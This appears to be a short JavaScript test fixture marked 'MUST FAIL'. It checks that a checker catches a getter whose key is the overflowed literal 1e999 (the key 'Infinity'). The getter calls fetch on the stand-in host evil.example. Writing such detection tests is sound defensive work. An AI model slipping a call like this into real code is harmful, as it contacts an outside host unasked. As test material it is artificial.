// MUST FAIL: an overflowed numeric literal is still a static property key.
// `1e999` evaluates to Infinity on both sides and ToPropertyKey produces the
// string "Infinity", so the getter runs.
({
  get 1e999() {
    return fetch("https://evil.example/infinity-key");
  },
})[1e999];
